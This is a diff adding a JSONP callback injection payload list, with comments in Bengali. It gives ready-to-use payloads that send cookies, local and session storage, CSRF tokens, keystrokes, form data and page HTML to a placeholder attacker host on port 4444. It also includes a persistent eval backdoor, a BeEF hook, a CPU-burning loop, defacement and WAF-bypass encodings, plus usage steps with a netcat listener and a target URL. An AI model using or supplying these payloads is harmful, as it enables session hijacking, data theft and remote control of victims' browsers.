@@ -1,0 +1,76 @@
+// ============= JSONP INJECTION - মাস্টার পেলোড লিস্ট 2026 =============
+
+// 1. বেসিক ডিটেকশন
+?callback=alert(1)
+?callback=alert(document.domain)
+?callback=console.log(1)
+?callback=confirm(1)
+
+// 2. কুকি চুরি (Cookie Stealing)
+?callback=fetch('http://YOUR-IP:4444?c='+document.cookie)
+?callback=new Image().src='http://YOUR-IP:4444?c='+document.cookie
+?callback=location.href='http://YOUR-IP:4444?c='+document.cookie
+?callback=window.location='http://YOUR-IP:4444?c='+document.cookie
+
+// 3. সেশন ডাটা চুরি (Local/Session Storage)
+?callback=fetch('http://YOUR-IP:4444',{method:'POST',body:JSON.stringify(localStorage)})
+?callback=fetch('http://YOUR-IP:4444?ls='+JSON.stringify(localStorage))
+?callback=fetch('http://YOUR-IP:4444?ss='+JSON.stringify(sessionStorage))
+
+// 4. পেজ ডাটা এক্সফিলট্রেট
+?callback=fetch('http://YOUR-IP:4444?html='+btoa(document.documentElement.innerHTML))
+?callback=fetch('http://YOUR-IP:4444?url='+window.location.href)
+
+// 5. WAF বাইপাস (Encoding)
+?callback=alert`1`
+?callback=eval(atob('YWxlcnQoMSk='))
+?callback=%61%6c%65%72%74(1)
+?callback=ALERT(1)
+?callback=alert(1)%0A
+
+// 6. পার্মানেন্ট ব্যাকডোর
+?callback=setInterval(()=>{fetch('http://YOUR-IP:4444/cmd').then(r=>r.text()).then(eval)},5000)
+
+// 7. কী-লগার (Keylogger)
+?callback=document.onkeypress=e=>fetch('http://YOUR-IP:4444?k='+e.key)
+
+// 8. ফর্ম হাইজ্যাক (Form Hijacking)
+?callback=document.forms[0].addEventListener('submit',e=>fetch('http://YOUR-IP:4444?d='+new FormData(e.target)))
+
+// 9. ক্লিকজ্যাকিং + রিডাইরেক্ট
+?callback=window.location='http://YOUR-IP:4444/phishing.html'
+
+// 10. ক্রিপ্টো মাইনার (CPU Hijack)
+?callback=setInterval(()=>{for(i=0;i<1000000;i++)Math.random()},100)
+
+// 11. ডম ডিফেসমেন্ট
+?callback=document.body.innerHTML='<h1 style=color:red>HACKED</h1>'
+
+// 12. বিটিডব্লিউ (BeEF) হুক
+?callback=function(d){var s=document.createElement('script');s.src='http://YOUR-IP:3000/hook.js';document.body.appendChild(s)}
+
+// 13. CSRF টোকেন চুরি
+?callback=fetch('/api/user').then(r=>r.json()).then(d=>fetch('http://YOUR-IP:4444?csrf='+d.csrf_token))
+
+// 14. ইমেল/ফোন এক্সফিলট্রেট (যদি DOM এ থাকে)
+?callback=fetch('http://YOUR-IP:4444?email='+document.querySelector('[name=email]').value)
+
+// 15. অল-ইন-ওয়ান মেগা পেলোড
+?callback=function(d){fetch('http://YOUR-IP:4444',{method:'POST',body:JSON.stringify({cookies:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage,url:location.href,html:btoa(document.body.innerHTML)})})}
+
+// ============= কিভাবে ব্যবহার করবেন =============
+// 1. YOUR-IP এর জায়গায় আপনার IP দিন: 172.22.33.47
+// 2. লিসেনার চালান: nc -lvp 4444
+// 3. URL এ পেস্ট করুন:
+//    http://localhost:3000/api/user-data?callback=YOUR_PAYLOAD
+
+// ============= সবচেয়ে গুরুত্বপূর্ণ 3টি পেলোড (প্রায়ই কাজ করে) =============
+
+// #1 কুকি চুরি (সবার প্রথম试试)
+?callback=fetch('http://YOUR-IP:4444?c='+document.cookie)
+
+// #2 এলার্ট টেস্ট
+?callback=alert(1)
+
+// #3 ডিফেসমেন্ট
+?callback=document.body.innerHTML='<h1>HACKED</h1>'
